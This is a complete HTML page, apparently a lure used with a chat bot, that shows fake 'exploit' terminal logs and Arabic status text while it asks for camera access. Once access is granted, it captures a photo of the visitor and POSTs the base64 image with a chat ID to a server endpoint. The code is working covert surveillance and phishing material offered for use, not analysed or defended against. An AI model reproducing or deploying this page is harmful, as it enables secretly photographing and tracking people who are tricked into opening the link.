<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>System Access</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  body {
    background-color: #000; color: #0f0; font-family: 'Share Tech Mono', monospace;
    margin: 0; padding: 20px; display: flex; flex-direction: column;
    height: 100vh; box-sizing: border-box; overflow: hidden;
  }
  #terminal { flex-grow: 1; overflow-y: auto; font-size: 14px; line-height: 1.5; }
  .line { margin-bottom: 5px; opacity: 0; animation: fadeIn 0.1s forwards; }
  .blink { animation: blink 1s step-end infinite; }
  @keyframes fadeIn { to { opacity: 1; } }
  @keyframes blink { 50% { opacity: 0; } }
  #status { font-weight: bold; color: #fff; margin-top: 20px; text-align: center; }
  .spinner {
    border: 3px solid #0f0; border-top: 3px solid transparent;
    border-radius: 50%; width: 30px; height: 30px;
    animation: spin 1s linear infinite; margin: 20px auto;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<div id="terminal"></div>
<div id="status">
  <div class="spinner" id="spinner"></div>
  <span id="status-text">جاري الاتصال...</span>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
  const urlParams = new URLSearchParams(window.location.search);
  const chatId = urlParams.get('chatId');
  const term = document.getElementById('terminal');
  const statusText = document.getElementById('status-text');
  const spinner = document.getElementById('spinner');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  const logs = [
    "[*] Initializing exploit framework...",
    "[*] Targeting device OS...",
    "[*] Bypassing firewall...",
    "[*] Establishing secure connection...",
    "[*] Accessing camera hardware...",
    "[!] Waiting for user authorization..."
  ];

  function addLog(text) {
    const div = document.createElement('div');
    div.className = 'line';
    div.innerText = text;
    term.appendChild(div);
    term.scrollTop = term.scrollHeight;
  }

  async function run() {
    if(!chatId) {
      statusText.innerText = "Error: Invalid Token.";
      statusText.style.color = "#f00";
      return;
    }

    // طبع اللوجات عشان تمغط الوقت
    for (let i = 0; i < logs.length; i++) {
        addLog(logs[i]);
        await new Promise(r => setTimeout(r, 600));
    }

    try {
      // طلب الكاميرا (هيظهر إشعار المتصفح هنا)
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" }, audio: false 
      });
      
      addLog("[+] Camera access granted.");
      addLog("[*] Capturing frame...");
      statusText.innerText = "جاري المعالجة...";
      video.srcObject = stream;

      setTimeout(() => {
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.8);

        fetch('/api/photo', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, image_b64: imageData })
        }).then(res => {
            if(res.ok) {
                spinner.style.display = 'none';
                statusText.innerText = "تم الاتصال بنجاح.";
                statusText.style.color = "#0f0";
                addLog("[+] Data sent successfully.");
                addLog("[*] Connection closed.");
            } else {
                throw new Error();
            }
        }).catch(e => {
            spinner.style.display = 'none';
            statusText.innerText = "فشل الاتصال.";
            statusText.style.color = "#f00";
        });
      }, 2000); 

    } catch (err) {
      addLog("[-] Authorization denied.");
      spinner.style.display = 'none';
      statusText.innerText = "تم رفض الصلاحية. أعد المحاولة.";
      statusText.style.color = "#f00";
    }
  }

  run();
</script>
</body>
</html>
